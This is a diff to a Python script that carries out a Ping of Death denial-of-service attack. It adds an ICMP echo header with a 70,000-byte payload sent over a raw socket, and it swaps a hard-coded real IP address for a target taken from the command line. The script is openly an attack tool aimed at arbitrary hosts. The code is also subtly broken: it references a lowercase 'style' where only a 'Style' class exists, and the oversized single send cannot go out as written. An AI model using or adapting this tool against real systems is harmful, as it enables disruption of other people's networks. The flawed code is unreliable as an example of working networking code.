@@ -10,6 +10,8 @@ Description:
 """
 
 import socket
+import struct
+import sys
 
 class Style:
     RED = '\033[31m'
@@ -24,16 +26,23 @@ def send_pod_attack(target_ip):
     """
     Send oversized ICMP packets to simulate Ping of Death
     """
+    #construct an ICMP Echo Request packet
+    icmp_type = 8       # echo request
+    icmp_code = 0
+    icmp_checksum = 0
+    icmp_id = 1
+    icmp_seq = 1
+    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+
+    # Defind an oversized packet, larger than 65534
+    # Exceeds maximum allowable size
+    payload = b"A" * 70000
+    packet = header + payload
     try:
         # Create a raw socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-
-        # Define an oversized packet
-        # Exceeds maximum allowable size
-        oversized_packet = b"A" * 65536
-
         # Send the packet to the target
-        sock.sendto(oversized_packet, (target_ip, 1))
+        sock.sendto(packet, (target_ip, 0))
 
         print(style.GREEN + f"Ping of Death packet send to {target_ip}" +
               style.RESET)
@@ -41,7 +50,12 @@ def send_pod_attack(target_ip):
         print(style.RED + f"[-]ERROR: {e}" + style.RESET)
 
 def main():
-    target_ip = "162.210.97.174"
+    if len(sys.argv) != 2:
+        print(style.YELLOW + "SYNTAX: file-name [target-ip]" + style.RESET)
+        return
+
+    #target_ip = "162.210.97.174"
+    target_ip = sys.argv[1]
     send_pod_attack(target_ip)
 
     
